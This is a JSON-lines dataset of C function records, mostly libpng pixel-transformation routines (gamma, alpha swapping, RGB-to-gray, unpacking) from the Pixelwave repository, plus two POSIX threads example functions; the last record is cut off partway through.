{"docstring": "/* Set the action on getting a CRC error for an ancillary or critical chunk. */\n", "func_signal": "void PNGAPI\npng_set_crc_action(png_structp png_ptr, int crit_action, int ancil_action)", "code": "{\n   png_debug(1, \"in png_set_crc_action\");\n \n   if (png_ptr == NULL)\n      return;\n\n   /* Tell libpng how we react to CRC errors in critical chunks */\n   switch (crit_action)\n   {\n      case PNG_CRC_NO_CHANGE:                        /* Leave setting as is */\n         break;\n\n      case PNG_CRC_WARN_USE:                               /* Warn/use data */\n         png_ptr->flags &= ~PNG_FLAG_CRC_CRITICAL_MASK;\n         png_ptr->flags |= PNG_FLAG_CRC_CRITICAL_USE;\n         break;\n\n      case PNG_CRC_QUIET_USE:                             /* Quiet/use data */\n         png_ptr->flags &= ~PNG_FLAG_CRC_CRITICAL_MASK;\n         png_ptr->flags |= PNG_FLAG_CRC_CRITICAL_USE |\n                           PNG_FLAG_CRC_CRITICAL_IGNORE;\n         break;\n\n      case PNG_CRC_WARN_DISCARD:    /* Not a valid action for critical data */\n         png_warning(png_ptr,\n            \"Can't discard critical data on CRC error\");\n      case PNG_CRC_ERROR_QUIT:                                /* Error/quit */\n\n      case PNG_CRC_DEFAULT:\n      default:\n         png_ptr->flags &= ~PNG_FLAG_CRC_CRITICAL_MASK;\n         break;\n   }\n\n   /* Tell libpng how we react to CRC errors in ancillary chunks */\n   switch (ancil_action)\n   {\n      case PNG_CRC_NO_CHANGE:                       /* Leave setting as is */\n         break;\n\n      case PNG_CRC_WARN_USE:                              /* Warn/use data */\n         png_ptr->flags &= ~PNG_FLAG_CRC_ANCILLARY_MASK;\n         png_ptr->flags |= PNG_FLAG_CRC_ANCILLARY_USE;\n         break;\n\n      case PNG_CRC_QUIET_USE:                            /* Quiet/use data */\n         png_ptr->flags &= ~PNG_FLAG_CRC_ANCILLARY_MASK;\n         png_ptr->flags |= PNG_FLAG_CRC_ANCILLARY_USE |\n                           PNG_FLAG_CRC_ANCILLARY_NOWARN;\n         break;\n\n      case PNG_CRC_ERROR_QUIT:                               /* Error/quit */\n         png_ptr->flags &= ~PNG_FLAG_CRC_ANCILLARY_MASK;\n         png_ptr->flags |= PNG_FLAG_CRC_ANCILLARY_NOWARN;\n         break;\n\n      case PNG_CRC_WARN_DISCARD:                      /* Warn/discard data */\n\n      case PNG_CRC_DEFAULT:\n      default:\n         png_ptr->flags &= ~PNG_FLAG_CRC_ANCILLARY_MASK;\n         break;\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_read_swap_alpha(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_read_swap_alpha\");\n\n   {\n      png_uint_32 row_width = row_info->width;\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n      {\n         /* This converts from RGBA to ARGB */\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_byte save;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               save = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = save;\n            }\n         }\n         /* This converts from RRGGBBAA to AARRGGBB */\n         else\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_byte save[2];\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               save[0] = *(--sp);\n               save[1] = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = save[0];\n               *(--dp) = save[1];\n            }\n         }\n      }\n      else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA)\n      {\n         /* This converts from GA to AG */\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_byte save;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               save = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = save;\n            }\n         }\n         /* This converts from GGAA to AAGG */\n         else\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_byte save[2];\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               save[0] = *(--sp);\n               save[1] = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = save[0];\n               *(--dp) = save[1];\n            }\n         }\n      }\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_read_invert_alpha(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_read_invert_alpha\");\n\n   {\n      png_uint_32 row_width = row_info->width;\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n      {\n         /* This inverts the alpha channel in RGBA */\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               *(--dp) = (png_byte)(255 - *(--sp));\n\n/*             This does nothing:\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               We can replace it with:\n*/\n               sp-=3;\n               dp=sp;\n            }\n         }\n         /* This inverts the alpha channel in RRGGBBAA */\n         else\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               *(--dp) = (png_byte)(255 - *(--sp));\n               *(--dp) = (png_byte)(255 - *(--sp));\n\n/*             This does nothing:\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n               We can replace it with:\n*/\n               sp-=6;\n               dp=sp;\n            }\n         }\n      }\n      else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA)\n      {\n         /* This inverts the alpha channel in GA */\n         if (row_info->bit_depth == 8)\n         {\n            png_bytep sp = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               *(--dp) = (png_byte)(255 - *(--sp));\n               *(--dp) = *(--sp);\n            }\n         }\n         /* This inverts the alpha channel in GGAA */\n         else\n         {\n            png_bytep sp  = row + row_info->rowbytes;\n            png_bytep dp = sp;\n            png_uint_32 i;\n\n            for (i = 0; i < row_width; i++)\n            {\n               *(--dp) = (png_byte)(255 - *(--sp));\n               *(--dp) = (png_byte)(255 - *(--sp));\n/*\n               *(--dp) = *(--sp);\n               *(--dp) = *(--sp);\n*/\n               sp-=2;\n               dp=sp;\n            }\n         }\n      }\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_gamma(png_row_infop row_info, png_bytep row,\n   png_bytep gamma_table, png_uint_16pp gamma_16_table,\n   int gamma_shift)", "code": "{\n   png_bytep sp;\n   png_uint_32 i;\n   png_uint_32 row_width=row_info->width;\n\n   png_debug(1, \"in png_do_gamma\");\n\n   if (\n       ((row_info->bit_depth <= 8 && gamma_table != NULL) ||\n        (row_info->bit_depth == 16 && gamma_16_table != NULL)))\n   {\n      switch (row_info->color_type)\n      {\n         case PNG_COLOR_TYPE_RGB:\n         {\n            if (row_info->bit_depth == 8)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  *sp = gamma_table[*sp];\n                  sp++;\n                  *sp = gamma_table[*sp];\n                  sp++;\n                  *sp = gamma_table[*sp];\n                  sp++;\n               }\n            }\n            else /* if (row_info->bit_depth == 16) */\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 v;\n\n                  v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n                  v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n                  v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n               }\n            }\n            break;\n         }\n\n         case PNG_COLOR_TYPE_RGB_ALPHA:\n         {\n            if (row_info->bit_depth == 8)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  *sp = gamma_table[*sp];\n                  sp++;\n                  *sp = gamma_table[*sp];\n                  sp++;\n                  *sp = gamma_table[*sp];\n                  sp++;\n                  sp++;\n               }\n            }\n            else /* if (row_info->bit_depth == 16) */\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n                  v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n                  v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 4;\n               }\n            }\n            break;\n         }\n\n         case PNG_COLOR_TYPE_GRAY_ALPHA:\n         {\n            if (row_info->bit_depth == 8)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  *sp = gamma_table[*sp];\n                  sp += 2;\n               }\n            }\n            else /* if (row_info->bit_depth == 16) */\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 4;\n               }\n            }\n            break;\n         }\n\n         case PNG_COLOR_TYPE_GRAY:\n         {\n            if (row_info->bit_depth == 2)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i += 4)\n               {\n                  int a = *sp & 0xc0;\n                  int b = *sp & 0x30;\n                  int c = *sp & 0x0c;\n                  int d = *sp & 0x03;\n\n                  *sp = (png_byte)(\n                      ((((int)gamma_table[a|(a>>2)|(a>>4)|(a>>6)])   ) & 0xc0)|\n                      ((((int)gamma_table[(b<<2)|b|(b>>2)|(b>>4)])>>2) & 0x30)|\n                      ((((int)gamma_table[(c<<4)|(c<<2)|c|(c>>2)])>>4) & 0x0c)|\n                      ((((int)gamma_table[(d<<6)|(d<<4)|(d<<2)|d])>>6) ));\n                  sp++;\n               }\n            }\n\n            if (row_info->bit_depth == 4)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i += 2)\n               {\n                  int msb = *sp & 0xf0;\n                  int lsb = *sp & 0x0f;\n\n                  *sp = (png_byte)((((int)gamma_table[msb | (msb >> 4)]) & 0xf0)\n                      | (((int)gamma_table[(lsb << 4) | lsb]) >> 4));\n                  sp++;\n               }\n            }\n\n            else if (row_info->bit_depth == 8)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  *sp = gamma_table[*sp];\n                  sp++;\n               }\n            }\n\n            else if (row_info->bit_depth == 16)\n            {\n               sp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 v = gamma_16_table[*(sp + 1) >> gamma_shift][*sp];\n                  *sp = (png_byte)((v >> 8) & 0xff);\n                  *(sp + 1) = (png_byte)(v & 0xff);\n                  sp += 2;\n               }\n            }\n            break;\n         }\n      }\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Handle alpha and tRNS via a background color */\n", "func_signal": "void PNGAPI\npng_set_background(png_structp png_ptr,\n   png_color_16p background_color, int background_gamma_code,\n   int need_expand, double background_gamma)", "code": "{\n   png_debug(1, \"in png_set_background\");\n \n   if (png_ptr == NULL)\n      return;\n   if (background_gamma_code == PNG_BACKGROUND_GAMMA_UNKNOWN)\n   {\n      png_warning(png_ptr, \"Application must supply a known background gamma\");\n      return;\n   }\n\n   png_ptr->transformations |= PNG_BACKGROUND;\n   png_memcpy(&(png_ptr->background), background_color,\n      png_sizeof(png_color_16));\n   png_ptr->background_gamma = (float)background_gamma;\n   png_ptr->background_gamma_type = (png_byte)(background_gamma_code);\n   png_ptr->transformations |= (need_expand ? PNG_BACKGROUND_EXPAND : 0);\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_unshift(png_row_infop row_info, png_bytep row, png_color_8p sig_bits)", "code": "{\n   png_debug(1, \"in png_do_unshift\");\n\n   if (\n       row_info->color_type != PNG_COLOR_TYPE_PALETTE)\n   {\n      int shift[4];\n      int channels = 0;\n      int c;\n      png_uint_16 value = 0;\n      png_uint_32 row_width = row_info->width;\n\n      if (row_info->color_type & PNG_COLOR_MASK_COLOR)\n      {\n         shift[channels++] = row_info->bit_depth - sig_bits->red;\n         shift[channels++] = row_info->bit_depth - sig_bits->green;\n         shift[channels++] = row_info->bit_depth - sig_bits->blue;\n      }\n      else\n      {\n         shift[channels++] = row_info->bit_depth - sig_bits->gray;\n      }\n      if (row_info->color_type & PNG_COLOR_MASK_ALPHA)\n      {\n         shift[channels++] = row_info->bit_depth - sig_bits->alpha;\n      }\n\n      for (c = 0; c < channels; c++)\n      {\n         if (shift[c] <= 0)\n            shift[c] = 0;\n         else\n            value = 1;\n      }\n\n      if (!value)\n         return;\n\n      switch (row_info->bit_depth)\n      {\n         case 2:\n         {\n            png_bytep bp;\n            png_uint_32 i;\n            png_uint_32 istop = row_info->rowbytes;\n\n            for (bp = row, i = 0; i < istop; i++)\n            {\n               *bp >>= 1;\n               *bp++ &= 0x55;\n            }\n            break;\n         }\n\n         case 4:\n         {\n            png_bytep bp = row;\n            png_uint_32 i;\n            png_uint_32 istop = row_info->rowbytes;\n            png_byte mask = (png_byte)((((int)0xf0 >> shift[0]) & (int)0xf0) |\n               (png_byte)((int)0xf >> shift[0]));\n\n            for (i = 0; i < istop; i++)\n            {\n               *bp >>= shift[0];\n               *bp++ &= mask;\n            }\n            break;\n         }\n\n         case 8:\n         {\n            png_bytep bp = row;\n            png_uint_32 i;\n            png_uint_32 istop = row_width * channels;\n\n            for (i = 0; i < istop; i++)\n            {\n               *bp++ >>= shift[i%channels];\n            }\n            break;\n         }\n\n         case 16:\n         {\n            png_bytep bp = row;\n            png_uint_32 i;\n            png_uint_32 istop = channels * row_width;\n\n            for (i = 0; i < istop; i++)\n            {\n               value = (png_uint_16)((*bp << 8) + *(bp + 1));\n               value >>= shift[i%channels];\n               *bp++ = (png_byte)(value >> 8);\n               *bp++ = (png_byte)(value & 0xff);\n            }\n            break;\n         }\n      }\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Expand tRNS chunks to alpha channels. */\n", "func_signal": "void PNGAPI\npng_set_tRNS_to_alpha(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_tRNS_to_alpha\");\n\n   png_ptr->transformations |= (PNG_EXPAND | PNG_EXPAND_tRNS);\n   png_ptr->flags &= ~PNG_FLAG_ROW_INIT;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Expand paletted images to RGB, expand grayscale images of\n * less than 8-bit depth to 8-bit depth, and expand tRNS chunks\n * to alpha channels.\n */\n", "func_signal": "void PNGAPI\npng_set_expand(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_expand\");\n\n   if (png_ptr == NULL)\n      return;\n\n   png_ptr->transformations |= (PNG_EXPAND | PNG_EXPAND_tRNS);\n   png_ptr->flags &= ~PNG_FLAG_ROW_INIT;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_unpack(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_unpack\");\n\n   if (row_info->bit_depth < 8)\n   {\n      png_uint_32 i;\n      png_uint_32 row_width=row_info->width;\n\n      switch (row_info->bit_depth)\n      {\n         case 1:\n         {\n            png_bytep sp = row + (png_size_t)((row_width - 1) >> 3);\n            png_bytep dp = row + (png_size_t)row_width - 1;\n            png_uint_32 shift = 7 - (int)((row_width + 7) & 0x07);\n            for (i = 0; i < row_width; i++)\n            {\n               *dp = (png_byte)((*sp >> shift) & 0x01);\n               if (shift == 7)\n               {\n                  shift = 0;\n                  sp--;\n               }\n               else\n                  shift++;\n\n               dp--;\n            }\n            break;\n         }\n\n         case 2:\n         {\n\n            png_bytep sp = row + (png_size_t)((row_width - 1) >> 2);\n            png_bytep dp = row + (png_size_t)row_width - 1;\n            png_uint_32 shift = (int)((3 - ((row_width + 3) & 0x03)) << 1);\n            for (i = 0; i < row_width; i++)\n            {\n               *dp = (png_byte)((*sp >> shift) & 0x03);\n               if (shift == 6)\n               {\n                  shift = 0;\n                  sp--;\n               }\n               else\n                  shift += 2;\n\n               dp--;\n            }\n            break;\n         }\n\n         case 4:\n         {\n            png_bytep sp = row + (png_size_t)((row_width - 1) >> 1);\n            png_bytep dp = row + (png_size_t)row_width - 1;\n            png_uint_32 shift = (int)((1 - ((row_width + 1) & 0x01)) << 2);\n            for (i = 0; i < row_width; i++)\n            {\n               *dp = (png_byte)((*sp >> shift) & 0x0f);\n               if (shift == 4)\n               {\n                  shift = 0;\n                  sp--;\n               }\n               else\n                  shift = 4;\n\n               dp--;\n            }\n            break;\n         }\n      }\n      row_info->bit_depth = 8;\n      row_info->pixel_depth = (png_byte)(8 * row_info->channels);\n      row_info->rowbytes = row_width * row_info->channels;\n   }\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* Expand paletted images to RGB. */\n", "func_signal": "void PNGAPI\npng_set_palette_to_rgb(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_palette_to_rgb\");\n\n   if (png_ptr == NULL)\n      return;\n\n   png_ptr->transformations |= (PNG_EXPAND | PNG_EXPAND_tRNS);\n   png_ptr->flags &= ~PNG_FLAG_ROW_INIT;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_rgb_to_gray(png_structp png_ptr, png_row_infop row_info, png_bytep row)", "code": "{\n   png_uint_32 i;\n\n   png_uint_32 row_width = row_info->width;\n   int rgb_error = 0;\n\n   png_debug(1, \"in png_do_rgb_to_gray\");\n\n   if (\n      (row_info->color_type & PNG_COLOR_MASK_COLOR))\n   {\n      png_uint_32 rc = png_ptr->rgb_to_gray_red_coeff;\n      png_uint_32 gc = png_ptr->rgb_to_gray_green_coeff;\n      png_uint_32 bc = png_ptr->rgb_to_gray_blue_coeff;\n\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB)\n      {\n         if (row_info->bit_depth == 8)\n         {\n#if defined(PNG_READ_GAMMA_SUPPORTED) || defined(PNG_READ_BACKGROUND_SUPPORTED)\n            if (png_ptr->gamma_from_1 != NULL && png_ptr->gamma_to_1 != NULL)\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n\n               for (i = 0; i < row_width; i++)\n               {\n                  png_byte red   = png_ptr->gamma_to_1[*(sp++)];\n                  png_byte green = png_ptr->gamma_to_1[*(sp++)];\n                  png_byte blue  = png_ptr->gamma_to_1[*(sp++)];\n                  if (red != green || red != blue)\n                  {\n                     rgb_error |= 1;\n                     *(dp++) = png_ptr->gamma_from_1[\n                       (rc*red + gc*green + bc*blue)>>15];\n                  }\n                  else\n                     *(dp++) = *(sp - 1);\n               }\n            }\n            else\n#endif\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_byte red   = *(sp++);\n                  png_byte green = *(sp++);\n                  png_byte blue  = *(sp++);\n                  if (red != green || red != blue)\n                  {\n                     rgb_error |= 1;\n                     *(dp++) = (png_byte)((rc*red + gc*green + bc*blue)>>15);\n                  }\n                  else\n                     *(dp++) = *(sp - 1);\n               }\n            }\n         }\n\n         else /* RGB bit_depth == 16 */\n         {\n#if defined(PNG_READ_GAMMA_SUPPORTED) || defined(PNG_READ_BACKGROUND_SUPPORTED)\n            if (png_ptr->gamma_16_to_1 != NULL &&\n                png_ptr->gamma_16_from_1 != NULL)\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 red, green, blue, w;\n\n                  red   = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  green = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  blue  = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n\n                  if (red == green && red == blue)\n                     w = red;\n                  else\n                  {\n                     png_uint_16 red_1   = png_ptr->gamma_16_to_1[(red&0xff) >>\n                                  png_ptr->gamma_shift][red>>8];\n                     png_uint_16 green_1 =\n                         png_ptr->gamma_16_to_1[(green&0xff) >>\n                                  png_ptr->gamma_shift][green>>8];\n                     png_uint_16 blue_1  = png_ptr->gamma_16_to_1[(blue&0xff) >>\n                                  png_ptr->gamma_shift][blue>>8];\n                     png_uint_16 gray16  = (png_uint_16)((rc*red_1 + gc*green_1\n                                  + bc*blue_1)>>15);\n                     w = png_ptr->gamma_16_from_1[(gray16&0xff) >>\n                         png_ptr->gamma_shift][gray16 >> 8];\n                     rgb_error |= 1;\n                  }\n\n                  *(dp++) = (png_byte)((w>>8) & 0xff);\n                  *(dp++) = (png_byte)(w & 0xff);\n               }\n            }\n            else\n#endif\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 red, green, blue, gray16;\n\n                  red   = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  green = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  blue  = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n\n                  if (red != green || red != blue)\n                     rgb_error |= 1;\n                  gray16  = (png_uint_16)((rc*red + gc*green + bc*blue)>>15);\n                  *(dp++) = (png_byte)((gray16>>8) & 0xff);\n                  *(dp++) = (png_byte)(gray16 & 0xff);\n               }\n            }\n         }\n      }\n      if (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA)\n      {\n         if (row_info->bit_depth == 8)\n         {\n#if defined(PNG_READ_GAMMA_SUPPORTED) || defined(PNG_READ_BACKGROUND_SUPPORTED)\n            if (png_ptr->gamma_from_1 != NULL && png_ptr->gamma_to_1 != NULL)\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_byte red   = png_ptr->gamma_to_1[*(sp++)];\n                  png_byte green = png_ptr->gamma_to_1[*(sp++)];\n                  png_byte blue  = png_ptr->gamma_to_1[*(sp++)];\n                  if (red != green || red != blue)\n                     rgb_error |= 1;\n                  *(dp++) =  png_ptr->gamma_from_1\n                             [(rc*red + gc*green + bc*blue)>>15];\n                  *(dp++) = *(sp++);  /* alpha */\n               }\n            }\n            else\n#endif\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_byte red   = *(sp++);\n                  png_byte green = *(sp++);\n                  png_byte blue  = *(sp++);\n                  if (red != green || red != blue)\n                     rgb_error |= 1;\n                  *(dp++) =  (png_byte)((rc*red + gc*green + bc*blue)>>15);\n                  *(dp++) = *(sp++);  /* alpha */\n               }\n            }\n         }\n         else /* RGBA bit_depth == 16 */\n         {\n#if defined(PNG_READ_GAMMA_SUPPORTED) || defined(PNG_READ_BACKGROUND_SUPPORTED)\n            if (png_ptr->gamma_16_to_1 != NULL &&\n                png_ptr->gamma_16_from_1 != NULL)\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 red, green, blue, w;\n\n                  red   = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  green = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n                  blue  = (png_uint_16)(((*(sp))<<8) | *(sp+1)); sp+=2;\n\n                  if (red == green && red == blue)\n                     w = red;\n                  else\n                  {\n                     png_uint_16 red_1   = png_ptr->gamma_16_to_1[(red&0xff) >>\n                         png_ptr->gamma_shift][red>>8];\n                     png_uint_16 green_1 =\n                         png_ptr->gamma_16_to_1[(green&0xff) >>\n                         png_ptr->gamma_shift][green>>8];\n                     png_uint_16 blue_1  = png_ptr->gamma_16_to_1[(blue&0xff) >>\n                         png_ptr->gamma_shift][blue>>8];\n                     png_uint_16 gray16  = (png_uint_16)((rc * red_1\n                         + gc * green_1 + bc * blue_1)>>15);\n                     w = png_ptr->gamma_16_from_1[(gray16&0xff) >>\n                         png_ptr->gamma_shift][gray16 >> 8];\n                     rgb_error |= 1;\n                  }\n\n                  *(dp++) = (png_byte)((w>>8) & 0xff);\n                  *(dp++) = (png_byte)(w & 0xff);\n                  *(dp++) = *(sp++);  /* alpha */\n                  *(dp++) = *(sp++);\n               }\n            }\n            else\n#endif\n            {\n               png_bytep sp = row;\n               png_bytep dp = row;\n               for (i = 0; i < row_width; i++)\n               {\n                  png_uint_16 red, green, blue, gray16;\n                  red   = (png_uint_16)((*(sp)<<8) | *(sp+1)); sp+=2;\n                  green = (png_uint_16)((*(sp)<<8) | *(sp+1)); sp+=2;\n                  blue  = (png_uint_16)((*(sp)<<8) | *(sp+1)); sp+=2;\n                  if (red != green || red != blue)\n                     rgb_error |= 1;\n                  gray16  = (png_uint_16)((rc*red + gc*green + bc*blue)>>15);\n                  *(dp++) = (png_byte)((gray16>>8) & 0xff);\n                  *(dp++) = (png_byte)(gray16 & 0xff);\n                  *(dp++) = *(sp++);  /* alpha */\n                  *(dp++) = *(sp++);\n               }\n            }\n         }\n      }\n   row_info->channels -= (png_byte)2;\n      row_info->color_type &= ~PNG_COLOR_MASK_COLOR;\n      row_info->pixel_depth = (png_byte)(row_info->channels *\n         row_info->bit_depth);\n      row_info->rowbytes = PNG_ROWBYTES(row_info->pixel_depth, row_width);\n   }\n   return rgb_error;\n}", "path": "Pixelwave\\ExternalFrameworks\\libpng\\pngrtran.c", "repo_name": "spiralstorm/Pixelwave", "stars": 56, "license": "other", "language": "c", "size": 11782}
{"docstring": "/*\n * Handle cleanup when the read lock condition variable\n * wait is cancelled.\n *\n * Simply record that the thread is no longer waiting,\n * and unlock the mutex.\n */\n", "func_signal": "static void rwl_readcleanup (void *arg)", "code": "{\n    rwlock_t    *rwl = (rwlock_t *)arg;\n\n    rwl->r_wait--;\n    pthread_mutex_unlock (&rwl->mutex);\n}", "path": "rwlock.c", "repo_name": "hailinzeng/Programming-POSIX-Threads", "stars": 56, "license": "None", "language": "c", "size": 150}
{"docstring": "/*\n * Loop until cancelled. The thread can be cancelled at any\n * point within the inner loop, where asynchronous cancellation\n * is enabled. The loop multiplies the two matrices matrixa\n * and matrixb.\n */\n", "func_signal": "void *thread_routine (void *arg)", "code": "{\n    int cancel_type, status;\n    int i, j, k, value = 1;\n    \n    /*\n     * Initialize the matrices to something arbitrary.\n     */\n    for (i = 0; i < SIZE; i++)\n        for (j = 0; j < SIZE; j++) {\n            matrixa[i][j] = i;\n            matrixb[i][j] = j;\n        }\n\n    while (1) {\n        /*\n         * Compute the matrix product of matrixa and matrixb.\n         */\n        status = pthread_setcanceltype (\n                PTHREAD_CANCEL_ASYNCHRONOUS,\n                &cancel_type);\n        if (status != 0)\n            err_abort (status, \"Set cancel type\");\n        for (i = 0; i < SIZE; i++)\n            for (j = 0; j < SIZE; j++) {\n                matrixc[i][j] = 0;\n                for (k = 0; k < SIZE; k++)\n                    matrixc[i][j] += matrixa[i][k] * matrixb[k][j];\n            }\n        status = pthread_setcanceltype (\n                cancel_type,\n                &cancel_type);\n        if (status != 0)\n            err_abort (status, \"Set cancel type\");\n\n        /*\n         * Copy the result (matrixc) into matrixa to start again\n         */\n        for (i = 0; i < SIZE; i++)\n            for (j = 0; j < SIZE; j++)\n                matrixa[i][j] = matrixc[i][j];\n    }\n}", "path": "cancel_async.c", "repo_name": 